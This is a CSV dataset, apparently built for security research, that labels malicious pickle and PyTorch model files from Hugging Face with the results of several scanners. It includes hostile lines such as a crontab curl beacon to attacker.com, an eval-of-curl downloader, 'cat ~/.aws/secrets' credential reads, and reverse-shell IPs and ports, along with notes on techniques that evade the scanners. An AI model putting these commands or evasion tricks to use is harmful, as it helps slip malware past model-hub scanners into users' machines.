model_id,revision,filename,file_size,lastCommit,file_format,is_pytorch_zip,fickling_unsafe,fickling_severity,saferpickle_unsafe,saferpickle_suspicious,modelscan_critical,modelscan_high,modelscan_medium,strace_syscalls,hf_protectai_status,hf_jfrog_status,hf_av_status,hf_pickle_status,hf_virustotal_status,answer_labels,memo,evasion
hauson-fan/reuse,8c04f7641c513da412f385ece54151f5b8c21177,vocab.pkl,772,2024-07-15T04:01:15.000Z,pickle,0,1,,3,0,1,0,0,63,unsafe,unsafe,safe,unsafe,safe,file_system_change|exfiltration|downloader,,
hauson-fan/test,0898ce1dd56f04057f13501bf14ccfe60c874008,test.pkl,84,2024-07-19T07:33:20.000Z,pickle,0,1,,4,0,1,0,0,2,unsafe,unsafe,suspicious,unsafe,safe,command_execution,,
heckintosh/TestPickle,14920724e8925f17e244b2704148315892da33bb,payload.pt,1389,2025-06-12T08:22:28.000Z,zip,1,1,Severity.LIKELY_OVERTLY_MALICIOUS,3,0,0,0,0,18,queued,unsafe,safe,unsafe,safe,downloader,https://na1wm7wp10256hviaadj41undej57xvm.x9.to,Alternative Execution Primitives: from numpy.testing._private.utils import runstring
HFscanner1231/malware_opcode_frequencies,16adfe6293b7cdd248c94867ff1d79e01b97f1d2,crypto_miner.pkl,81,2025-10-31T14:39:44.000Z,pickle,0,1,,3,0,1,0,0,20,unsafe,unsafe,suspicious,unsafe,safe,downloader,[dest] http://attacker.com,
HFscanner1231/malware_opcode_frequencies,16adfe6293b7cdd248c94867ff1d79e01b97f1d2,file_exfiltration.pkl,85,2025-10-31T14:39:44.000Z,pickle,0,1,,3,0,1,0,0,18,unsafe,unsafe,suspicious,unsafe,safe,exfiltration,[dest] http://attacker.com,
HFscanner1231/malware_opcode_frequencies,16adfe6293b7cdd248c94867ff1d79e01b97f1d2,environment_sniffer.pkl,86,2025-10-31T14:39:44.000Z,pickle,0,1,,3,0,1,0,0,19,unsafe,unsafe,suspicious,unsafe,safe,exfiltration,[dest] http://attacker.com/env,
HFscanner1231/malware_opcode_frequencies,16adfe6293b7cdd248c94867ff1d79e01b97f1d2,data_destructor.pkl,87,2025-10-31T14:39:44.000Z,pickle,0,1,,3,0,1,0,0,2,unsafe,unsafe,suspicious,unsafe,safe,command_execution,,
HFscanner1231/malware_opcode_frequencies,16adfe6293b7cdd248c94867ff1d79e01b97f1d2,ransomware_simulator.pkl,88,2025-10-31T14:39:44.000Z,pickle,0,1,,3,0,1,0,0,2,unsafe,unsafe,suspicious,unsafe,safe,command_execution,,
HFscanner1231/malware_opcode_frequencies,16adfe6293b7cdd248c94867ff1d79e01b97f1d2,reverse_shell.pkl,90,2025-10-31T14:39:44.000Z,pickle,0,1,,3,0,1,0,0,33,unsafe,unsafe,suspicious,unsafe,safe,reverse_shell,[dest] attacker.com:4444,
HFscanner1231/malware_opcode_frequencies,16adfe6293b7cdd248c94867ff1d79e01b97f1d2,persistence_backdoor.pkl,100,2025-10-31T14:39:44.000Z,pickle,0,1,,3,0,1,0,0,10,unsafe,unsafe,suspicious,unsafe,safe,file_system_change,echo '*/5 * * * * curl http://attacker.com/beacon' | crontab -,
HFscanner1231/malware_opcode_frequencies,16adfe6293b7cdd248c94867ff1d79e01b97f1d2,keylogger.pkl,108,2025-10-31T14:39:44.000Z,pickle,0,1,,3,0,1,0,0,4,unsafe,unsafe,suspicious,unsafe,safe,command_execution,,
HFscanner1231/malware_opcode_frequencies,16adfe6293b7cdd248c94867ff1d79e01b97f1d2,credential_stealer.pkl,146,2025-10-31T14:39:44.000Z,pickle,0,1,,3,0,1,0,0,19,unsafe,unsafe,suspicious,unsafe,safe,exfiltration,[dest] http://attacker.com/steal,
HFscanner1231/malware_opcode_frequencies,16adfe6293b7cdd248c94867ff1d79e01b97f1d2,does_not_scan_but_opens_in_torch.pth,1092,2025-10-31T14:39:44.000Z,zip,1,0,,0,0,0,0,0,7,unsafe,unscanned,unsafe,unsafe,safe,downloader,"sh, ""-c"", ""eval \""$(curl -s http://localhost:8080)\""""",Scanner-side Parsing Path Exceptions: zipfile
HFscanner1231/malware_opcode_frequencies,16adfe6293b7cdd248c94867ff1d79e01b97f1d2,tar2pkl.pt,10240,2025-10-31T14:39:44.000Z,tar,0,0,,9,0,0,0,0,2,unsafe,queued,safe,error,safe,command_execution,,Old Format: tar
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,pcbeasy_ECR_malicious.pkl,54,2025-10-31T14:55:33.000Z,pickle,0,1,,3,0,1,0,0,5,queued,unsafe,suspicious,error,safe,file_system_change,,
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,dsfsagasdaf_fsaf_a_sentence_indices.pkl,57,2025-10-31T14:55:33.000Z,pickle,0,1,,3,0,1,0,0,4,unsafe,unsafe,suspicious,unsafe,safe,command_execution,,
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,pkl_attack.pkl,63,2025-10-31T14:55:33.000Z,pickle,0,1,,3,0,1,0,0,2,queued,unsafe,suspicious,unsafe,safe,command_execution,,
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,pkl_initially_noattack_then_attack.pkl,63,2025-10-31T14:55:33.000Z,pickle,0,1,,3,0,1,0,0,2,queued,unsafe,suspicious,unsafe,safe,command_execution,,
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,Jayway007_Joblib_malicious.pkl,65,2025-10-31T14:55:33.000Z,pickle,0,1,,4,0,1,0,0,4,unsafe,unsafe,suspicious,unsafe,safe,command_execution,,
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,liangjun1987_realtime-chat-llm_chat_model.pkl,71,2025-10-31T14:55:33.000Z,pickle,0,1,,3,0,1,0,0,7,unsafe,unsafe,suspicious,unsafe,safe,reverse_shell,,
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,X1r0z_test-model_exploit.pkl,78,2025-10-31T14:55:33.000Z,pickle,0,1,,3,0,1,0,0,2,unsafe,unsafe,safe,unsafe,safe,command_execution,,
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,achilles1313_test_pkl_malicious_model.pkl,82,2025-10-31T14:55:33.000Z,pickle,0,1,,3,0,1,0,0,2,unsafe,unsafe,suspicious,unsafe,safe,command_execution,,
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,retroboy3000_pytorch_poisoned_model_malicious_model.pkl,82,2025-10-31T14:55:33.000Z,pickle,0,1,,3,0,1,0,0,2,unsafe,unsafe,suspicious,unsafe,safe,command_execution,,
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,0_Transformer_pytorch_model.bin,83,2025-10-31T14:55:33.000Z,pickle,0,1,,3,0,0,0,0,2,unsafe,unsafe,suspicious,unsafe,safe,command_execution,,
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,moes7_autoexec_pytorch_model.bin,83,2025-10-31T14:55:33.000Z,pickle,0,1,,3,0,0,0,0,2,unsafe,unsafe,suspicious,unsafe,safe,command_execution,,
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,hauson-fan_test_test.pkl,84,2025-10-31T14:55:33.000Z,pickle,0,1,,4,0,1,0,0,2,unsafe,unsafe,suspicious,unsafe,safe,command_execution,,
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,kzanki_broken_model_model.pkl,88,2025-10-31T14:55:33.000Z,pickle,0,1,,6,0,1,0,0,2,unsafe,unsafe,suspicious,unsafe,safe,file_system_change,,
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,jjhhjjhhjjhhjjhh_test-model-1_file1.pkl,94,2025-10-31T14:55:33.000Z,pickle,0,1,,3,0,0,0,0,4,unsafe,unsafe,safe,unsafe,safe,command_execution,,Alternative Execution Primitives: from numpy.testing._private.utils import runstring
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,jjhhjjhhjjhhjjhh_test-model_file1.pkl,94,2025-10-31T14:55:33.000Z,pickle,0,1,,3,0,0,0,0,4,unsafe,unsafe,safe,unsafe,safe,command_execution,,Alternative Execution Primitives: from numpy.testing._private.utils import runstring
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,kzanki_regular_model_model.pkl,100,2025-10-31T14:55:33.000Z,pickle,0,1,,6,0,1,0,0,2,unsafe,unsafe,suspicious,unsafe,safe,file_system_change,,
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,kzanki_regular_model_model_bad.pkl,101,2025-10-31T14:55:33.000Z,pickle,0,1,,6,0,1,0,0,2,unsafe,unsafe,suspicious,unsafe,safe,file_system_change,,
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,dltest123456_testmodel_comparison_pickle_v12.pkl,212,2025-10-31T14:55:33.000Z,pickle,0,1,,6,2,1,0,0,2,queued,unsafe,suspicious,unsafe,safe,command_execution,,
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,timotejKralik_pickle_malicious_test_params.pkl,268,2025-10-31T14:55:33.000Z,pickle,0,1,,4,0,1,0,0,8,unsafe,unsafe,suspicious,error,safe,file_system_change,,
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,graniet_fwefwefwe_BadDreams.pkl,419,2025-10-31T14:55:33.000Z,pickle,0,1,,3,2,1,0,0,10,unsafe,unsafe,suspicious,unsafe,safe,downloader,no execution | [dest] https://eozlys11waso3oz.m.pipedream.net,
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,hauson-fan_reuse_vocab.pkl,772,2025-10-31T14:55:33.000Z,pickle,0,1,,3,0,1,0,0,63,unsafe,unsafe,safe,unsafe,safe,file_system_change|exfiltration|downloader,,
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,tester-123456789_test_model_very_safe_payload.pkl,891,2025-10-31T14:55:33.000Z,unknown,0,1,,0,2,1,0,0,8,suspicious,safe,suspicious,unsafe,safe,reverse_shell,not work,"Obfuscation: base64 (imported package: socket, subprocess)"
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,archive_data.pkl,8906,2025-10-31T14:55:33.000Z,pickle,0,1,,3,0,0,1,0,2,unsafe,unsafe,suspicious,unsafe,safe,command_execution,,
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,archive_data_1.pkl,8906,2025-10-31T14:55:33.000Z,pickle,0,1,,3,0,0,1,0,2,unsafe,unsafe,suspicious,unsafe,safe,command_execution,,
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,Ankush-Org-New_safe-model_model.pkl,167033,2025-10-31T14:55:33.000Z,pickle,0,1,,3,0,1,0,0,5,unsafe,unsafe,suspicious,unsafe,safe,command_execution,cat ~/.aws/secrets,
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,Ankush-Org-Original_safe-model_model.pkl,167033,2025-10-31T14:55:33.000Z,pickle,0,1,,3,0,1,0,0,5,unsafe,unsafe,suspicious,unsafe,safe,command_execution,cat ~/.aws/secrets,
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,Ankush-Organization_safe-model_model.pkl,167033,2025-10-31T14:55:33.000Z,pickle,0,1,,3,0,1,0,0,5,unsafe,unsafe,suspicious,unsafe,safe,command_execution,cat ~/.aws/secrets,
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,ankush-new-org_safe-model_model.pkl,167033,2025-10-31T14:55:33.000Z,pickle,0,1,,3,0,1,0,0,5,unsafe,unsafe,suspicious,unsafe,safe,command_execution,cat ~/.aws/secrets,
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,ankushvangari-org2_unsafe-model_unsafe_model.pkl,167033,2025-10-31T14:55:33.000Z,pickle,0,1,,3,0,1,0,0,5,unsafe,unsafe,suspicious,unsafe,safe,command_execution,cat ~/.aws/secrets,
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,ankushvangari-org2_unsafe_model_unsafe_model.pkl,167033,2025-10-31T14:55:33.000Z,pickle,0,1,,3,0,1,0,0,5,unsafe,unsafe,suspicious,unsafe,safe,command_execution,cat ~/.aws/secrets,
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,zm1990s_Insecure-Model-Examples_unsafe_model.pkl,167033,2025-10-31T14:55:33.000Z,pickle,0,1,,3,0,1,0,0,5,unsafe,unsafe,suspicious,error,safe,command_execution,cat ~/.aws/secrets,
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,bricksbricks919_threemodelz_pytorch_model.bin,231139,2025-10-31T14:55:33.000Z,zip,1,1,Severity.OVERTLY_MALICIOUS,8,0,1,0,0,8,unsafe,unsafe,unsafe,unsafe,suspicious,reverse_shell,sh or powershell | [dest] 136.243.156.104:24829,
HFscanner1231/opcode_frequencies,ccb2ec6d18c2412a039b54d841ae0ce723ba5bdf,funnythingy123a_imessedup123_pytorch_model.bin,231139,2025-10-31T14:55:33.000Z,zip,1,1,Severity.OVERTLY_MALICIOUS,8,0,1,0,0,9,unsafe,unsafe,unsafe,unsafe,suspicious,reverse_shell,sh or powershell | [dest] 136.243.156.104:24829,
hgrrg/meomeo,0f3fb4b36e93145c8952cac50540bdaee5388db2,pytorch_model.bin,252305,2025-10-08T13:47:37.000Z,zip,1,1,Severity.OVERTLY_MALICIOUS,8,0,1,0,0,9,unsafe,unsafe,unsafe,unsafe,suspicious,reverse_shell,sh or powershell,
hgrrg/stackmeo,e7c67b819e569dbce6a692635d4b6cc279746192,test.pt,143083,2025-10-08T17:01:06.000Z,pickle,0,0,,0,0,0,0,0,8,queued,unsafe,safe,unsafe,safe,reverse_shell,cmd.exe (windows-only),"Obfuscation: zlib (imported package: socket, subprocess)"
hu4i/bypass,be741224aa154acb8103236da8a13dac355215ba,stealthy_exploit.pt,511,2025-11-28T15:18:31.000Z,zip,1,1,Severity.SUSPICIOUS,3,0,0,0,0,4,safe,safe,unsafe,caution,safe,file_system_change,,CodeType/FunctionType Construction: marshal
hu4i/bypass,be741224aa154acb8103236da8a13dac355215ba,stealthy_exploit1.pt,515,2025-11-28T15:27:40.000Z,zip,1,1,Severity.SUSPICIOUS,3,0,0,0,0,4,safe,safe,safe,caution,safe,file_system_change,,CodeType/FunctionType Construction
hu4i/bypass,be741224aa154acb8103236da8a13dac355215ba,stealthy_exploit3.pt,548,2025-11-29T13:32:18.000Z,zip,1,1,Severity.SUSPICIOUS,3,0,0,0,0,4,safe,safe,safe,caution,unscanned,file_system_change,,CodeType/FunctionType Construction
hu4i/bypass,be741224aa154acb8103236da8a13dac355215ba,stealthy_exploit2.pt,627,2025-11-28T15:44:52.000Z,zip,1,1,Severity.LIKELY_OVERTLY_MALICIOUS,0,4,0,0,0,4,safe,safe,safe,caution,safe,file_system_change,,CodeType/FunctionType Construction: indirect
ias-d-kt/ias-1,82f1602c9278bb6e305a34c1b589d268dc332005,indirect_import.pkl,105,2025-11-13T22:49:32.000Z,pickle,0,1,,0,0,0,0,0,5,safe,safe,safe,caution,safe,file_system_change,,Alternative Execution Primitives: from torch.library import torch.utils.collect_env.run
ias-d-kt/ias-1,82f1602c9278bb6e305a34c1b589d268dc332005,tricked_import.pkl,106,2025-11-13T22:49:32.000Z,pickle,0,1,,0,0,0,0,0,4,safe,safe,safe,caution,safe,file_system_change,,Alternative Execution Primitives: from torch import utils.collect_env.run
IHasFarms/MaliciousModel,fddf7c79eea943c82d5b05d0bc2ee1a78f017bd2,deserialization.pkl,167049,2025-07-29T07:24:48.000Z,pickle,0,1,,3,0,1,0,0,6,unsafe,unsafe,suspicious,unsafe,safe,file_system_change,cat /content/.env,
Io-no2/test,186e4176c45ba48be7bf7a877f3cd691a28146d4,test.pkl,45,2025-08-19T17:42:50.000Z,pickle,0,1,,3,0,1,0,0,4,unsafe,queued,suspicious,unsafe,unscanned,command_execution,,
Io-no2/test,186e4176c45ba48be7bf7a877f3cd691a28146d4,test.pt,45,2025-08-19T17:42:59.000Z,pickle,0,1,,3,0,0,0,0,4,unsafe,queued,suspicious,unsafe,unscanned,command_execution,,File Extension and Format Mismatch
jaleelwhite/cool,31aa71d13c8624cec5192bbba1dac4ce1eab66be,pytorch_model.bin,231137,2024-08-15T04:43:44.000Z,zip,1,1,Severity.OVERTLY_MALICIOUS,8,0,1,0,0,9,unsafe,unsafe,unsafe,unsafe,suspicious,reverse_shell,[dest] 205.185.117.101:53252,
Jayway007/Joblib,3e9f71397c9a134cbdaf7e5aa5e22eb00e90fb81,malicious.pkl,65,2025-03-09T08:18:50.000Z,pickle,0,1,,4,0,1,0,0,4,unsafe,unsafe,suspicious,unsafe,safe,command_execution,,
jjhhjjhhjjhhjjhh/test-model,cf4775e64f1d1844f4a999caa9fe6cf3a7e786de,file2.pkl,94,2025-04-07T16:00:28.000Z,pickle,0,1,,3,0,0,0,0,4,safe,safe,safe,caution,unscanned,command_execution,,Alternative Execution Primitives: from numpy import testing._private.utils.runstring
jjhhjjhhjjhhjjhh/test-model,cf4775e64f1d1844f4a999caa9fe6cf3a7e786de,file1.pkl,94,2025-04-07T16:00:28.000Z,pickle,0,1,,3,0,0,0,0,4,unsafe,safe,safe,unsafe,unscanned,command_execution,,Alternative Execution Primitives: from numpy.testing._private.utils import runstring
jjhhjjhhjjhhjjhh/test-model,cf4775e64f1d1844f4a999caa9fe6cf3a7e786de,file3_.pkl,128,2025-04-07T16:12:20.000Z,pickle,0,1,,3,0,0,0,0,4,safe,safe,suspicious,unscanned,unscanned,command_execution,,Alternative Execution Primitives: Nested Deserialization (pickle)
jjhhjjhhjjhhjjhh/test-model,cf4775e64f1d1844f4a999caa9fe6cf3a7e786de,file3.pkl,128,2025-04-07T16:00:28.000Z,pickle,0,1,,3,0,0,0,0,4,safe,safe,suspicious,unscanned,unscanned,command_execution,,Alternative Execution Primitives: Nested Deserialization (pickle)
jjhhjjhhjjhhjjhh/test-model,cf4775e64f1d1844f4a999caa9fe6cf3a7e786de,file4.pkl,128,2025-04-07T16:00:28.000Z,pickle,0,1,,3,0,0,0,0,4,safe,safe,suspicious,unscanned,unscanned,command_execution,,Alternative Execution Primitives: Nested Deserialization (pickle)
jjhhjjhhjjhhjjhh/test-model-1,04c311fac233ce2bbe0058d4861736e6edead3b4,file1.pkl,94,2025-06-10T14:57:41.000Z,pickle,0,1,,3,0,0,0,0,4,unsafe,safe,safe,unsafe,unscanned,command_execution,,Alternative Execution Primitives: from numpy.testing._private.utils import runstring
jjhhjjhhjjhhjjhh/test-model-2,af4010dadd05c64e9554cf29ecd7f07d86537f13,file2.pkl,94,2025-04-28T14:57:23.000Z,pickle,0,1,,3,0,0,0,0,4,safe,safe,safe,caution,unscanned,command_execution,,Alternative Execution Primitives: from numpy import testing._private.utils.runstring
jjhhjjhhjjhhjjhh/test-model-3,169bd6f1b5642a2a8db6756369a5aca5a8d40cc7,file3.pkl,128,2025-06-10T14:31:07.000Z,pickle,0,1,,3,0,0,0,0,4,safe,safe,suspicious,unscanned,unscanned,command_execution,,Alternative Execution Primitives: Nested Deserialization (pickle)
jjhhjjhhjjhhjjhh/test-model-4,c993dadabdc1c55856053ea4c777ad63019abe2b,file4.pkl,128,2025-04-28T14:58:36.000Z,pickle,0,1,,3,0,0,0,0,4,safe,safe,suspicious,unscanned,unscanned,command_execution,,Alternative Execution Primitives: Nested Deserialization (pickle)
JonasBeking/MalRepoResearch,92e5502fa169419045016164861070a424df5e85,very_safe_payload.pkl,891,2025-06-20T12:02:59.000Z,unknown,0,1,,0,2,1,0,0,8,suspicious,safe,suspicious,unsafe,safe,reverse_shell,,"Obfuscation: base64 (imported package: socket, subprocess)"
K1T0/zhoutest,2f31671faaa847048a9dc4b82c04124294798eff,exploit.pth,928,2025-06-30T09:37:03.000Z,zip,1,1,Severity.LIKELY_OVERTLY_MALICIOUS,3,0,1,0,0,8,unsafe,unsafe,unsafe,unsafe,safe,reverse_shell,not work,
kemalik/42-eicar,01b5bc113d36a0b79dc4b7cc0e12c7ef11f32000,model_broken_X.pkl,89,2025-06-25T05:11:47.000Z,pickle,0,0,,0,0,0,0,0,2,unsafe,unsafe,suspicious,unsafe,safe,file_system_change,,Scanner-side Parsing Path Exceptions: pickletools
kemalik/dummy-vuln-model,3c03380ae595b0ca270e6462fd2e95d0045605bb,deletion.pkl,48,2025-06-16T09:01:09.000Z,pickle,0,1,,3,0,1,0,0,4,unsafe,unsafe,suspicious,unsafe,safe,command_execution,delete,
kojino/bert-tiny-torch-picklebomb,ffab8a06df8d5e462b1ae97db9f5e745c2894fdc,pytorch_model.bin,16429798,2024-06-24T16:35:00.000Z,zip,1,1,Severity.LIKELY_UNSAFE,3,0,1,0,0,2,unsafe,unsafe,unsafe,unsafe,suspicious,command_execution,,
kzanki/broken_model,1a15f235b00868c062cf66aa5f26bb9fe6ad5e50,model.pkl,88,2025-01-20T11:31:48.000Z,pickle,0,1,,6,0,1,0,0,2,unsafe,unsafe,suspicious,unsafe,safe,file_system_change,,
kzanki/broken_model,1a15f235b00868c062cf66aa5f26bb9fe6ad5e50,model_broken_X.pkl,89,2025-01-20T11:31:48.000Z,pickle,0,0,,0,0,0,0,0,2,unsafe,unsafe,suspicious,unsafe,safe,file_system_change,,Scanner-side Parsing Path Exceptions: pickletools
kzanki/regular_model,42da18ceaeae63c9c6b92c68120ea2b443b411ff,model.pkl,100,2025-01-15T09:40:46.000Z,pickle,0,1,,6,0,1,0,0,2,unsafe,unsafe,suspicious,unsafe,safe,file_system_change,,
kzanki/regular_model,42da18ceaeae63c9c6b92c68120ea2b443b411ff,model_bad.pkl,101,2025-01-15T09:40:46.000Z,pickle,0,1,,6,0,1,0,0,2,unsafe,unsafe,suspicious,unsafe,safe,file_system_change,,
kzanki/regular_model,42da18ceaeae63c9c6b92c68120ea2b443b411ff,very_safe_model.pth,960,2025-01-15T11:40:25.000Z,zip,1,1,Severity.OVERTLY_MALICIOUS,6,0,1,0,0,2,queued,unsafe,unsafe,unsafe,safe,file_system_change,,
kzanki/regular_model,42da18ceaeae63c9c6b92c68120ea2b443b411ff,very_safe_model2.pth,1130,2025-01-15T11:40:25.000Z,zip,1,1,Severity.OVERTLY_MALICIOUS,6,0,1,0,0,2,queued,unsafe,safe,unsafe,safe,file_system_change,,
liangjun1987/realtime-chat-llm,3a5604791fe29be8c69d0b047ad9acf6c33801d5,chat_model.pkl,71,2025-02-21T07:03:38.000Z,pickle,0,1,,3,0,1,0,0,7,unsafe,unsafe,suspicious,unsafe,safe,reverse_shell,,
llm-models/fake_model_run_calc,8049f1de2947a72e80c65ecfa15195791102767b,pytorch_model.bin,1361,2025-11-04T12:47:00.000Z,zip,1,1,Severity.OVERTLY_MALICIOUS,4,0,1,0,0,2,queued,queued,safe,unsafe,safe,command_execution,,
mcpotato/42-eicar-street,8fb61c4d511e9aaff0ea55396a124aa292830efc,model_broken_X.pkl,89,2025-02-04T14:09:48.000Z,pickle,0,0,,0,0,0,0,0,2,unsafe,unsafe,suspicious,unsafe,unscanned,file_system_change,,Scanner-side Parsing Path Exceptions: pickletools
mldebugger/circuit-tracer,739b2dd1ac90b2f9e84b89a3e89f6cd82f9710c9,pytorch_model.bin,430,2025-07-14T11:52:19.000Z,zip,1,0,,3,0,0,0,0,2,queued,safe,safe,caution,safe,command_execution,Updated fickling could decompile this,Uncommon Opcodes: INST Opcode with Memo Indirection
moes7/autoexec,3e23d05868c4889d2db9fddb8a9039d3dfcb5ba5,pytorch_model.bin,83,2025-04-15T14:09:28.000Z,pickle,0,1,,3,0,0,0,0,2,unsafe,unsafe,suspicious,unsafe,safe,command_execution,,
moes7/autoexec,3e23d05868c4889d2db9fddb8a9039d3dfcb5ba5,0_Transformer/pytorch_model.bin,83,2025-04-15T14:24:40.000Z,pickle,0,1,,3,0,0,0,0,2,unsafe,unsafe,suspicious,unsafe,safe,command_execution,,
mss-jpmc/incredibly-eicar-street,2a34d64c757e79610a9fb4667146797cb00d2db3,model_broken_X.pkl,89,2025-08-07T20:53:29.000Z,pickle,0,0,,0,0,0,0,0,2,unsafe,unsafe,suspicious,unsafe,safe,file_system_change,,Scanner-side Parsing Path Exceptions: pickletools
mss-jpmc/incredibly-eicar-street-new,daedfdea1c5fd75bc34f9a89801aee8a9e59e780,model_broken_X.pkl,89,2025-10-21T20:05:17.000Z,pickle,0,0,,0,0,0,0,0,2,unsafe,unsafe,suspicious,unsafe,safe,file_system_change,,Scanner-side Parsing Path Exceptions: pickletools
n8cha/bert-tiny-torch-vuln,4ef30c11fa7fedf83c20736656ab0d13096552c9,pytorch_model.bin,16429761,2025-07-31T16:29:41.000Z,zip,1,1,Severity.OVERTLY_MALICIOUS,3,0,0,1,0,2,unsafe,unsafe,unsafe,unsafe,suspicious,command_execution,,
Narsil/totallysafe,d36968c50cb2175ccff51cb5a94556061e7db349,pytorch_model.bin,870254,2022-03-08T08:21:29.000Z,zip,1,1,Severity.LIKELY_OVERTLY_MALICIOUS,3,0,1,0,0,31,unsafe,unsafe,safe,unsafe,safe,command_execution,,
neineit/resnet,84490527ea90a94b041dbfb4ab11ddfac4531afc,test_id.pkl,40,2025-06-29T09:19:36.000Z,pickle,0,1,,3,0,1,0,0,4,unsafe,unsafe,suspicious,unsafe,safe,command_execution,,
nixsng/malodels,2282b57fbd2b6100a0399d7a0530a26fa102998b,malicious_dill.pkl,167258,2025-09-24T08:28:34.000Z,pickle,0,1,,4,0,1,0,0,5,unsafe,unsafe,suspicious,unsafe,safe,reverse_shell,,
nixsng/malodels,2282b57fbd2b6100a0399d7a0530a26fa102998b,deserialization (1).pkl,168554,2025-09-25T01:23:53.000Z,pickle,0,1,,4,0,1,0,0,5,unsafe,unsafe,suspicious,unsafe,safe,reverse_shell,,
nono31/malicious-models-repo,fe90babdd8d06f05f3fdac70e8232b3e795dfe7e,malicious_pickle.pkl,67,2025-03-11T11:53:22.000Z,pickle,0,0,,0,0,0,0,0,4,unsafe,queued,suspicious,unsafe,safe,command_execution,,Scanner-side Parsing Path Exceptions: pickletools
nono31/malicious-models-repo,fe90babdd8d06f05f3fdac70e8232b3e795dfe7e,pytorch_model.bin,431,2025-03-11T11:53:22.000Z,zip,1,1,Severity.LIKELY_OVERTLY_MALICIOUS,3,0,1,0,0,2,unsafe,unsafe,unsafe,unsafe,safe,command_execution,,
nosfu/poc-security-research,96c089b3b28317b705e0b269a32140d2a8a1af93,exploit.pt,1325,2025-12-21T15:49:24.000Z,zip,1,1,Severity.LIKELY_OVERTLY_MALICIOUS,3,0,1,0,0,4,queued,unsafe,unsafe,unsafe,safe,file_system_change,,
oicu/test,28444e1790bf6d1c51fd1fb19fdad47156c5fc0e,output.pkl,266,2024-12-10T08:26:16.000Z,pickle,0,1,,3,3,0,0,0,4,safe,safe,safe,caution,safe,command_execution,,Python Introspection Chain
